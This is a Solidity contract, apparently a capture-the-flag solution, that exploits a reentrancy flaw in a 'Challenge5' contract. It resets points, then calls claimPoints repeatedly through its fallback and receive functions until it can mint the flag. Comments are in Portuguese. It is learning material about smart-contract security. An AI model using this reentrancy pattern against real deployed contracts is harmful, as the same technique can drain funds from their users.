// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge5 {
    function resetPoints() external;
    function claimPoints() external;
    function mintFlag() external;
    function points(address) external view returns (uint256);
}

contract Challenge5Attacker {
    IChallenge5 public c;
    uint256 public targetReentries;   // quantas vezes reentrar (ex: 10)
    uint256 public count;            // contador de reentrâncias

    constructor(address challenge5) {
        c = IChallenge5(challenge5);
    }

    // inicia o ataque: zera e dispara claimPoints
    function attack(uint256 _targetReentries) external {
        targetReentries = _targetReentries;
        count = 0;

        // garante que points[tx.origin] == 0
        c.resetPoints();

        // primeira chamada vai fazer msg.sender.call("") pra ESTE contrato,
        // que entra no fallback e reentra
        c.claimPoints();
    }

    // depois de ter >=10 pontos, chama mint
    function mint() external {
        c.mintFlag();
    }

    // recebe a chamada vazia do Challenge5 e reentra
    fallback() external payable {
        if (count < targetReentries - 1) {
            count += 1;
            c.claimPoints();
        }
        // quando parar de reentrar, deixa retornar sucesso
    }

    receive() external payable {
        // opcional; fallback já cobre call(""), mas deixo por segurança
        if (count < targetReentries - 1) {
            count += 1;
            c.claimPoints();
        }
    }
}
